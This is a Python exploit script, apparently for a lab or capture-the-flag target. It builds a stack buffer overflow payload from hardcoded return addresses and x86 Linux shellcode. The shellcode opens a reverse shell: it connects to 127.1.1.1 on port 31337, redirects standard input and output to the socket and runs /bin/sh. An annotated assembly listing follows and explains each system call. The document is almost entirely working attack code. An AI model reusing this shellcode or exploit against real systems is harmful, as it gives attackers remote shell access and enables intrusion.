from struct import pack

p_addr = pack("<I", (0xbffeb8b8 + 4))
a_addr = pack("<I", (0xbffeb8b8 - 0x810))

x = "\x6a\x66\x58\x31\xdb\x6a\x01\x5b\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x92\x68\x7f\x01\x01\x01\x66\x68\x7a\x69\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\x6a\x03\x5b\x31\xc0\xb0\x66\xcd\x80\x87\xd3\x31\xc9\x31\xc0\xb0\x3f\xcd\x80\x6a\x01\x59\x31\xc0\xb0\x3f\xcd\x80\x31\xc9\x6a\x02\x59\x31\xc0\xb0\x3f\xcd\x80\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

garbo = "\xAA" * (0x810 - 16 - len(x))
print (x + garbo + a_addr + p_addr).strip()

'''
//=============
// Open Socket
// socket( AF_INET, SOCK_STREAM, IPPROTO_IP );
//=============
pushl $0x66
pop   %eax

xorl  %ebx, %ebx
pushl $0x1        // Socket call type
pop   %ebx

xorl  %edx, %edx
pushl %edx		  // IPPROTO_IP  (0)

pushl $0x1        // SOCK_STREAM (1)

pushl $0x2		  // AF_INET     (2)

movl  %esp, %ecx  // pointer to socket args
int   $0x80		  // call socket()
xchg %eax, %edx


//=============
//         \/- FROM SOCKET CALL   \/- BUILD THIS  \/- CALCULATE THIS
// connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));
//=============

pushl $0x0101017f // Anything on 127 subnet is local, so use 127.1.1.1 for no 0 bytes
pushw $0x697a     // The port we want (31337)

pushw $0x2	       // connect type
movl  %esp, %ecx  // Save address for struct 

pushl $0x10 	  // Size of arg
pushl %ecx	  // Pointer to struct
pushl %edx        // Saved socketfd


movl  %esp, %ecx  // pointer to socket args

pushl $0x3
pop   %ebx    
xorl  %eax, %eax  
movb  $0x66, %al  // Call connect
int   $0x80

xchg  %edx, %ebx

//=============
// Duplicate stdin and out for usage
//=============
xorl  %ecx, %ecx
xorl  %eax, %eax
movb  $0x3f, %al  // Call dup2
int   $0x80

pushl $0x1
pop   %ecx
xorl  %eax, %eax  
movb  $0x3f, %al  // Call dup2
int   $0x80

xorl  %ecx, %ecx
pushl $0x2
pop   %ecx
xorl  %eax, %eax  
movb  $0x3f, %al  // Call dup2
int   $0x80

//=============
// exec and go
//=============
xorl  %eax, %eax  
movb  $0xb, %al  // Call exec

xorl  %ecx, %ecx
xorl  %edx, %edx

pushl %edx
pushl $0x68732f2f // args
pushl $0x6e69622f

movl  %esp, %ebx
int   $0x80
'''